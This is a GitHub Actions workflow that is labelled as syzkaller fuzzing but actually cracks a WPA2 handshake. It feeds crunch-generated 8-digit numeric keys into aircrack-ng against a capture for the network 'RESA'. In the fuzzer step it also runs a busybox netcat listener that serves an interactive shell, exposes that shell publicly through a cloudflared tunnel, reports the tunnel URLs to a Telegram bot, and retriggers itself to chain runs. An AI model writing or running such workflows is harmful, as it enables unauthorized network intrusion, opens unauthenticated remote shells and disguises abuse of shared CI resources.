name: fuzz-resa #nama ini jangan dirubah, ntah kenapa error saat loop

# STOP: gh workflow disable "syzkaller fuzzing CI"
# gh run cancel 38494535088 --force
# START:
# gh workflow list --all        # lihat status: active / disabled_manually
# gh workflow enable "syzkaller fuzzing CI"

on:
  workflow_dispatch:
  push:
    branches: [origin/cruch_resume]
    paths:
      - ".github/workflows/fuzzing.yml"
      - "src/aircrack-ng/aircrack-ng.c"
  schedule:
    - cron: "0 */6 * * *"   # opsional, jaring pengaman kalau rantai putus

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false # jangan batalkan jika masih run, misal saat commit>

permissions:
  contents: read
  actions: write




jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 350 # paksa berhenti sebelum 6 jam
    env:
      CHAT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
      CHAT_ID: "7797309176"
      RUN_ID: "resa-WPA2 ${{ github.run_id }}"
      DURATION: ${{ inputs.seconds || '60' }}


    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y --no-install-recommends \
            build-essential \
            gettext libelf-dev \
            git ssh openssh-client curl jq \
            busybox-static netcat-openbsd crunch



      - name: Install aircrack-ng
        run: |
          ./autogen.sh
          ./configure --prefix=`pwd`/install
          make -j4
          make install


      - name: Buka tunnel ke web UI & listener nc
        run: |
          curl -L -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
          chmod +x cloudflared
          nohup ./cloudflared tunnel --no-autoupdate --url http://127.0.0.1:56741 > tunnel.log 2>&1 &

          URL=""
          for i in $(seq 1 30); do
            URL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' tunnel.log | head -1)
            [ -n "$URL" ] && break
            sleep 2
          done

          if [ -n "$URL" ]; then
            MSG="[$RUN_ID] Syzkaller UI: $URL"
          else
            MSG="[$RUN_ID] Syzkaller publik url"
          fi

          curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
            -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null


          # nc listener
          nohup ./cloudflared tunnel --no-autoupdate --url tcp://127.0.0.1:20022 > tunnel-nc.log 2>&1 &

          URL=""
          for i in $(seq 1 30); do
            URL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' tunnel-nc.log | head -1)
            [ -n "$URL" ] && break
            sleep 2
          done

          if [ -n "$URL" ]; then
            MSG="[$RUN_ID] Listener NC: $URL"
          else
            MSG="[$RUN_ID] nc publik url"
          fi

          curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
            -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null


      - name: Ambil state sesi sebelumnya
        continue-on-error: true
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          mkdir -p prev
          FOUND=0

          # 1. Coba ambil dari artifact run terakhir (repo saat ini)
          NAME="fuzz-state-${{ github.ref_name }}"
          ID=$(gh api "repos/${{ github.repository }}/actions/artifacts?name=$NAME&per_page=5" \
                 -q '[.artifacts[] | select(.expired==false)][0].id')

          if [ -n "$ID" ] && [ "$ID" != "null" ]; then
            echo "State ditemukan di artifact (id=$ID)"
            gh api "repos/${{ github.repository }}/actions/artifacts/$ID/zip" > prev.zip
            unzip -q prev.zip -d prev
            FOUND=1
            MSG="[$RUN_ID] Pakai corpus dari artifact: $NAME"
          fi

          # 2. Fallback: ambil dari release di repo lain lewat wget
          # gh release create "fuzz-state" fuzz-state.zip --title "x" --notes "x" --prerelease
          # gh release delete "fuzz-state" --yes
          if [ "$FOUND" -eq 0 ]; then
            OTHER_REPO="sunjangyo12/test-ci"
            TAG="fuzz-state"
            ASSET="fuzz-state.zip"

            URL="https://github.com/${OTHER_REPO}/releases/download/${TAG}/${ASSET}"

            if wget -q "$URL" -O prev.zip; then
              unzip -q prev.zip -d prev
              FOUND=1
              MSG="[$RUN_ID] State ditemukan di release repo lain"

            else
              MSG="[$RUN_ID] Gagal unduh dari release repo lain (mungkin belum ada)"
            fi
          fi

          if [ "$FOUND" -eq 1 ]; then
            ls -R prev | head -20
          else
            MSG="[$RUN_ID] Tidak ada state lama, mulai dari nol"
          fi

          # telegram
          curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
            -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null



      - name: Run Fuzzer Resa-WPA
        run: |
          set -o pipefail
          {
            # listener nc
            while [ 1 ]; do busybox nc -l -p 20022 -e /bin/sh -i; echo "start nc listen"; done &
            PID_NC=$!

            # lanjutkan corpus dari sesi sebelumnya
            if [ -d "$GITHUB_WORKSPACE/prev/workdir" ]; then
              cp "$GITHUB_WORKSPACE/prev/workdir/*" .
            else
              echo 0 > .count
            fi
            echo "############### fuzzzzzz"
            ls -la

            crunch 8 8 1234567890 --stdout | timeout -s INT -k 2m 2m \
              ./install/bin/aircrack-ng -w- mydata/resa.cap -e RESA || true


            RES=$(cat .count || echo 0)
            MSG="[$RUN_ID] Done current: $RES"
            curl -s "https://api.telegram.org/bot$CHAT_TOKEN/sendMessage" \
              -d chat_id="$CHAT_ID" --data-urlencode text="$MSG" > /dev/null || true

            # bersihkan semua proses latar belakang
            kill $PID_NC 2>/dev/null || true

          } 2>&1 | tee -a ~/mylog.txt


      - name: Collect artifacts
        if: always()
        run: |
          mkdir -p output/workdir

          cp ~/mylog.txt output/ || true
          cp .count output/ || true


      - name: Upload artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: fuzz-state-${{ github.ref_name }}
          path: output
          retention-days: 7



      - name: Lanjutkan sesi berikutnya
        if: ${{ !cancelled() }}
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          gh workflow run "${{ github.workflow }}" --ref ${{ github.ref_name }}
